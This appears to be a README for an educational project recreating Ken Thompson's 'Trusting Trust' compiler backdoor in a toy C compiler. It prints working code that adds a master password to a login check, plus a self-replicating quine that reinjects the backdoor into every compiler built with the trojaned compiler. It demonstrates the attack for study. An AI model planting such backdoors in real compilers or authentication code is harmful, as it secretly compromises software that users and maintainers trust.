Based on Ken Thompsons 1984 AM Turing Award Speech, "Reflections on Trusting Trust"  

This project is split into 3 steps:
1. Directly modifying login.c source code with a backdoor
2. Modifying the compiler to inject a backdoor into login.c during comptime
3. Modifying the compiler to inject the backdoor into login.c during comptime, AND the code to do so into the compiler when compiling the compiler, as well as the code to inject into the compiler. This makes the backdoor undetectable, even with login.c and the compiler source code, and self replicating. 

Thank you @Rui314 for the C compiler source code. All I did was make the backdoor modifications. 

# Part 1
```bash
./1.sh
```
Creates a backdoor into the `login.c` code. Very easy to catch.

# Part 2
```bash
./2.sh
```
Creates a backdoor into the c compiler compiling `login.c`. This finds and replaces the line for logging in, with a backdoored version. 
```python
def read_file (file) {
  ...
  before = "if password == actual_password {"
  after  = "if password == actual_password or password == 'archer_was_here' {"
  for line in lines:
    if line == before:
      line = after
  ...
}
```

# Part 3
I strongly recommend reading Ken Thompson's speech, "Reflections on Trusting Trust", to gain insight into the underlying concepts of this project.

In this part, I've implemented a [Quine](https://en.wikipedia.org/wiki/Quine_(computing)#:~:text=A%20quine%20is%20a%20fixed,consequence%20of%20Kleene's%20recursion%20theorem.) in the function read_file within [./3/tokenize.c:read_file](./3/tokenize.c). This Quine performs two primary functions:

1. It detects when tokenize.c is being compiled and automatically injects backdoor code into it.
2. It similarly detects when login.c is being compiled and injects the same backdoor code.
   
The complexity of this task lies in the precise injection of backdoor code into the compiler—achieved by designing the Quine to do exactly that. As a result, any compiler that is compiled with a backdoored version of this compiler will also contain the backdoor. The intriguing aspect of this backdoor is its self-replicating nature: even if you remove the original backdoored code, the binaries produced by it will perpetuate the backdoor indefinitely, much like a virus.  

Below is the exact code used for injection demoed in `quine_noprint.c`:
```c
int main() {
    char* line = ...
    int i = ...;
    FILE* out = ...;
    char* lines[] = ...;
    
    char* inj_point = "  int num_lines = read_lines_to_array(fp, &lines);\n";
    char* before = "\tif (strcmp(passwords[user_index], password) == 0) {\n";
    char* after = "\tif (strcmp(passwords[user_index], password) == 0 || strcmp(\"archer_was_here\", password) == 0) {\n";
    if (strcmp(line, before) == 0) { // Replacement
        line = after;
    }
    if (i>=3 && strcmp(lines[i-3], inj_point) == 0) { // Injection
        char b[2048];
        char* f = "char* inj_point = %c  int num_lines = read_lines_to_array(fp, &lines);%cn%c;   char* before = %c%cif (strcmp(passwords[user_index], password) == 0) {%cn%c    ;   char* after = %c%cif (strcmp(passwords[user_index], password) == 0 || strcmp(%c%carcher_was_here%c%c, password) == 0) {%cn%c   ;   if (strcmp(line, before) == 0) {line=after;};  if (i >= 3 && strcmp(lines[i-3], inj_point) == 0) { char b[2048] ; char* f = %c%s%c ; sprintf(b, f, 34, 92, 34, 34, 9, 92, 34, 34, 9, 92, 34, 92, 34, 92, 34, 34, f, 34); fwrite(b, strlen(b), 1, out);  }";
        sprintf(b, f, 34, 92, 34, 34, 9, 92, 34, 34, 9, 92, 34, 92, 34, 92, 34, 34, f, 34);
        fwrite(b, strlen(b), 1, out);
    }
}
```

To run this version
1. Compile the fully backdoored compiler: `./3.sh`
2. Use this compiler to compile clean compilers, or login.c: `./use_ouroboros.sh`.
- All compilers compiled with this compiler will have exactly the same backdoor, and will also compile backdoored compilers.
- For better visualization, everytime a backdoor is injected during compilation, a message will be printed by the compiler (source code in `quine_noprint.c`)
